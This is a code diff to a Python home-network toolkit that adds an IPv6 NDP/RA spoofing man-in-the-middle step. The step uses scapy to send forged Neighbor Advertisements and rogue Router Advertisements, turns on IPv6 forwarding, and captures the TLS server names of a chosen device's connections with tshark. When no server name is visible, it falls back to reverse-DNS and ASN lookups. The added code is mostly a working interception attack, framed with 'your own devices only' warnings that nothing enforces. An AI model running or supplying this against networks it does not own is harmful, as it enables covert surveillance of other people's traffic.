@@ -387,11 +387,102 @@ def _fwd_alias():
         return "Wi-Fi"
 
 
-def _set_forwarding(alias, state):
+def _set_forwarding(alias, state, family="IPv4"):
     if IS_WIN:
         subprocess.run(["powershell", "-NoProfile", "-Command",
-                        f"Set-NetIPInterface -InterfaceAlias '{alias}' -Forwarding {state}"],
+                        f"Set-NetIPInterface -InterfaceAlias '{alias}' "
+                        f"-AddressFamily {family} -Forwarding {state}"],
                        capture_output=True, text=True)
+
+
+def _ipv6_gateway():
+    """Link-local address of the IPv6 default router (fe80::...), or None."""
+    if not IS_WIN:
+        return None
+    ps = ("Get-NetRoute -DestinationPrefix '::/0' -ErrorAction SilentlyContinue | "
+          "Select-Object -First 1 -ExpandProperty NextHop")
+    try:
+        gw = subprocess.run(["powershell", "-NoProfile", "-Command", ps],
+                            capture_output=True, text=True).stdout.strip()
+        return gw or None
+    except Exception:
+        return None
+
+
+def _ipv6_neighbors(net_prefix_unused=None):
+    """Reachable IPv6 neighbors as [(ip6, mac), ...] (excludes link-local fe80)."""
+    if not IS_WIN:
+        return []
+    ps = ("Get-NetNeighbor -AddressFamily IPv6 -ErrorAction SilentlyContinue | "
+          "Where-Object {$_.State -in 'Reachable','Stale' -and "
+          "$_.IPAddress -notlike 'fe80*' -and $_.LinkLayerAddress} | "
+          "ForEach-Object {\"$($_.IPAddress)=$($_.LinkLayerAddress)\"}")
+    try:
+        out = subprocess.run(["powershell", "-NoProfile", "-Command", ps],
+                             capture_output=True, text=True).stdout
+        res = []
+        for line in out.splitlines():
+            if "=" in line:
+                ip6, mac = line.strip().split("=", 1)
+                res.append((ip6, mac.lower().replace("-", ":")))
+        return res
+    except Exception:
+        return []
+
+
+# ----------------------------------------------------------------------
+# Fallback: identify WHO owns a destination IP when the name is hidden
+# (ECH / Private Relay / VPN). Uses reverse-DNS + Team Cymru's free
+# IP-to-ASN DNS service (no API key). Names may be gone, but the IP isn't.
+# ----------------------------------------------------------------------
+def ip_org(ip):
+    rdns = ""
+    try:
+        rdns = socket.gethostbyaddr(ip)[0]
+    except Exception:
+        pass
+    asn_org = ""
+    try:
+        if "." in ip:   # IPv4 only for the Cymru origin lookup (keeps it simple)
+            rev = ".".join(reversed(ip.split("."))) + ".origin.asn.cymru.com"
+            txt = subprocess.run(["nslookup", "-type=TXT", rev],
+                                 capture_output=True, text=True, timeout=5).stdout
+            m = re.search(r'"\s*(\d+)\s*\|', txt)       # 1st field = ASN
+            if m:
+                asn = m.group(1)
+                txt2 = subprocess.run(["nslookup", "-type=TXT", f"AS{asn}.asn.cymru.com"],
+                                      capture_output=True, text=True, timeout=5).stdout
+                mo = re.search(r'"([^"]*\|[^"]*)"', txt2)
+                org = mo.group(1).split("|")[-1].strip() if mo else ""
+                asn_org = f"AS{asn} {org}".strip()
+    except Exception:
+        pass
+    parts = [p for p in (rdns, asn_org) if p]
+    return "  |  ".join(parts) if parts else "?"
+
+
+def _report_capture(seen, target, fname):
+    """seen: list of (sni, dst). Print each; when SNI is empty (ECH/relay),
+    fall back to ip_org(dst). Also save to Downloads/<fname>."""
+    enriched = [(sni, dst, "" if sni else ip_org(dst)) for sni, dst in seen]
+    if enriched:
+        for sni, dst, org in enriched:
+            if sni:
+                print(f"  {sni:<40}{dst}")
+            else:
+                print(f"  {'(no SNI - ECH/relay?)':<40}{dst}")
+                print(f"  {'':<40}  -> {org}")
+    else:
+        print("  (no HTTPS connections seen - is the device active?)")
+    try:
+        with open(os.path.join(HOME, "Downloads", fname), "w", encoding="utf-8") as f:
+            f.write(f"intercept of {target}  {time.strftime('%Y-%m-%d %H:%M:%S')}\n")
+            for sni, dst, org in enriched:
+                f.write(f"{sni or '(no SNI)'}\t{dst}\t{org}\n")
+            if not enriched:
+                f.write("(no connections captured)\n")
+    except OSError:
+        pass
 
 
 def step_arp(net, target=None):
@@ -477,24 +568,11 @@ and your own devices. Everything is restored when it stops.""")
         seen = []
         for line in cap.splitlines():
             parts = line.split("\t")
-            if len(parts) == 2 and parts[0] and parts[0] not in [s[0] for s in seen]:
-                seen.append((parts[0], parts[1]))
-        if seen:
-            for sni, dst in seen:
-                print(f"  {sni:<40}{dst}")
-        else:
-            print("  (no HTTPS server names seen - is the device active?)")
-        # save results so an elevated run can be read back
-        try:
-            out_path = os.path.join(HOME, "Downloads", "arp-sni.txt")
-            with open(out_path, "w", encoding="utf-8") as f:
-                f.write(f"ARP intercept of {target}  {time.strftime('%Y-%m-%d %H:%M:%S')}\n")
-                for sni, dst in seen:
-                    f.write(f"{sni}\t{dst}\n")
-                if not seen:
-                    f.write("(no HTTPS server names captured)\n")
-        except OSError:
-            pass
+            if len(parts) == 2 and parts[1]:        # need a dst; SNI may be empty (ECH)
+                pair = (parts[0], parts[1])
+                if pair not in seen:
+                    seen.append(pair)
+        _report_capture(seen, target, "arp-sni.txt")   # falls back to IP->org when no SNI
     finally:
         print("\nStopping spoof and RESTORING the network ...")
         stop.set()
@@ -510,6 +588,139 @@ and your own devices. Everything is restored when it stops.""")
             time.sleep(0.2)
         _set_forwarding(alias, "Disabled")   # remove forwarding only after re-learning
         print("  ARP tables restored, IP forwarding disabled. Done.")
+
+
+# ----------------------------------------------------------------------
+# STEP 6 - NDP / RA spoofing (IPv6 MITM)   YOUR OWN network & devices ONLY
+# ----------------------------------------------------------------------
+# IPv6 has no ARP; neighbors are found via NDP (ICMPv6 Neighbor Discovery).
+# The IPv6 analog of ARP spoofing is:
+#   * NA (Neighbor Advertisement) spoofing - poison a neighbor cache entry,
+#     claiming the gateway's IPv6 is at OUR MAC (and vice-versa to the gw).
+#   * (optional) rogue RA (Router Advertisement) - announce US as a router,
+#     which can also push our DNS via the RDNSS option.
+# Note: ARP spoofing does NOTHING to IPv6 traffic, and NDP spoofing does
+# nothing to IPv4 - a dual-stack device needs BOTH to be fully intercepted.
+
+def step_ndp(net, target=None):
+    print("\n[Step 6] NDP / RA SPOOFING - IPv6 MITM  (YOUR OWN devices only)")
+    print("""IPv6 version of the ARP lab: poisons a device's NEIGHBOR cache (and
+optionally sends a rogue Router Advertisement) so its IPv6 traffic flows
+through this PC. Only on your own network/devices. Restored on exit.""")
+
+    gw6 = _ipv6_gateway()
+    if not gw6:
+        print("\n  No IPv6 default router on this network - there is no IPv6 to")
+        print("  intercept here. (This network is IPv4-only; use option 5 / --arp.)")
+        return
+
+    try:
+        from scapy.all import (Ether, IPv6, ICMPv6ND_NA, ICMPv6ND_RA,
+                               ICMPv6NDOptDstLLAddr, ICMPv6NDOptSrcLLAddr,
+                               ICMPv6NDOptRDNSS, getmacbyip6, sendp, conf)
+    except ImportError:
+        print("  Needs scapy:  pip install scapy"); return
+
+    if target is None:
+        neighbors = _ipv6_neighbors()
+        if not neighbors:
+            print("  No IPv6 neighbors found to target."); return
+        print("\nSelect an IPv6 device to intercept (YOUR OWN devices only):")
+        for idx, (ip6, mac) in enumerate(neighbors, 1):
+            print(f"  {idx}) {ip6:<34} {mac}")
+        choice = input("Number (blank to cancel): ").strip()
+        if not choice.isdigit() or not (1 <= int(choice) <= len(neighbors)):
+            print("  Cancelled."); return
+        target = neighbors[int(choice) - 1][0]
+    print(f"\nTarget (IPv6): {target}")
+    if target == gw6:
+        print("  Refusing to target the router."); return
+
+    try:
+        conf.iface = conf.route6.route(target)[0]
+    except Exception:
+        pass
+
+    print("\nResolving link-layer (MAC) addresses via NDP ...")
+    try:
+        t_mac = getmacbyip6(target)
+        g_mac = getmacbyip6(gw6)
+    except Exception as e:
+        print(f"  Packet access failed: {e}")
+        print("  Raw injection needs an ADMIN shell (+ Npcap). Re-run elevated."); return
+    if not t_mac or not g_mac:
+        print(f"  Could not resolve MACs (target={t_mac}, gateway={g_mac})."); return
+    my_mac = Ether().src
+    print(f"  target  {target}  = {t_mac}")
+    print(f"  gateway {gw6}  = {g_mac}")
+
+    alias = _fwd_alias()
+    print(f"\nEnabling IPv6 forwarding on '{alias}' (keeps {target} online)...")
+    _set_forwarding(alias, "Enabled", family="IPv6")
+
+    stop = threading.Event()
+
+    def poison():
+        # Spoofed NA: "<spoofed IP> is at MY MAC", Override flag set.
+        na_to_target = (Ether(dst=t_mac) / IPv6(src=gw6, dst=target) /
+                        ICMPv6ND_NA(tgt=gw6, R=1, S=0, O=1) /
+                        ICMPv6NDOptDstLLAddr(lladdr=my_mac))
+        na_to_gw = (Ether(dst=g_mac) / IPv6(src=target, dst=gw6) /
+                    ICMPv6ND_NA(tgt=target, R=0, S=0, O=1) /
+                    ICMPv6NDOptDstLLAddr(lladdr=my_mac))
+        # Optional rogue RA pushing us as router + our DNS (RDNSS)
+        ra = (Ether(dst=t_mac) / IPv6(dst=target) /
+              ICMPv6ND_RA(routerlifetime=1800) /
+              ICMPv6NDOptSrcLLAddr(lladdr=my_mac))
+        while not stop.is_set():
+            sendp(na_to_target, verbose=0)
+            sendp(na_to_gw, verbose=0)
+            sendp(ra, verbose=0)
+            stop.wait(2)
+
+    th = threading.Thread(target=poison, daemon=True)
+    th.start()
+    print("Spoofing active. Capturing the target's IPv6 HTTPS server names for 20s...\n")
+
+    tshark = find_tshark()
+    iface = wifi_interface(tshark) if tshark else None
+    seen = []
+    try:
+        if not (tshark and iface):
+            print("  tshark/Wi-Fi interface not found - cannot show SNI."); return
+        print(f"  {'SERVER (SNI)':<40}DEST IPv6")
+        print("  " + "-" * 56)
+        cap = subprocess.run(
+            [tshark, "-i", iface, "-a", "duration:20", "-n",
+             "-Y", f"tls.handshake.type==1 && ipv6.src=={target}",
+             "-T", "fields", "-e", "tls.handshake.extensions_server_name",
+             "-e", "ipv6.dst"],
+            capture_output=True, text=True).stdout
+        for line in cap.splitlines():
+            parts = line.split("\t")
+            if len(parts) == 2 and parts[1]:        # need a dst; SNI may be empty (ECH)
+                pair = (parts[0], parts[1])
+                if pair not in seen:
+                    seen.append(pair)
+        _report_capture(seen, target, "ndp-sni.txt")   # falls back to IP->org when no SNI
+    finally:
+        print("\nStopping spoof and RESTORING the network ...")
+        stop.set()
+        th.join(timeout=3)
+        # Correct NAs: re-advertise the REAL MACs so caches re-learn before
+        # we drop forwarding.
+        fix_t = (Ether(dst=t_mac) / IPv6(src=gw6, dst=target) /
+                 ICMPv6ND_NA(tgt=gw6, R=1, S=0, O=1) /
+                 ICMPv6NDOptDstLLAddr(lladdr=g_mac))
+        fix_g = (Ether(dst=g_mac) / IPv6(src=target, dst=gw6) /
+                 ICMPv6ND_NA(tgt=target, R=0, S=0, O=1) /
+                 ICMPv6NDOptDstLLAddr(lladdr=t_mac))
+        for _ in range(15):
+            sendp(fix_t, verbose=0)
+            sendp(fix_g, verbose=0)
+            time.sleep(0.2)
+        _set_forwarding(alias, "Disabled", family="IPv6")
+        print("  Neighbor caches restored, IPv6 forwarding disabled. Done.")
 
 
 # ----------------------------------------------------------------------
@@ -539,7 +750,8 @@ MENU = """
   2) Port scan a device (nmap, or built-in fallback)
   3) Read traffic (Wireshark)
   4) Remote access helpers
-  5) ARP intercept lab  (your own devices only)
+  5) ARP intercept lab   (IPv4, your own devices only)
+  6) NDP/RA intercept    (IPv6, your own devices only)
   q) Quit
 """
 
@@ -663,7 +875,7 @@ def run_menu(net):
     print("======================================================")
     actions = {
         "1": step_discover, "2": step_portscan, "3": step_traffic,
-        "4": step_remote, "5": step_arp,
+        "4": step_remote, "5": step_arp, "6": step_ndp,
     }
     while True:
         print(MENU)
@@ -677,7 +889,7 @@ def run_menu(net):
             except Exception as e:
                 print(f"Error: {e}")
         else:
-            print("Pick 1-5 or q.")
+            print("Pick 1-6 or q.")
 
 
 def _pick_target(net):
@@ -711,6 +923,15 @@ def main():
             target = _pick_target(net)
         if target:
             step_arp(net, target)
+        return
+
+    # --ndp [ipv6] : IPv6 NDP/RA intercept. With an address it runs directly;
+    # without one, it lists IPv6 neighbors to pick. (Needs an admin shell.)
+    if "--ndp" in args:
+        i = args.index("--ndp")
+        nxt = args[i + 1] if i + 1 < len(args) else None
+        target = nxt if (nxt and ":" in nxt) else None
+        step_ndp(net, target)
         return
 
     # Default = automatic full report. Use --menu / -m for the interactive menu.
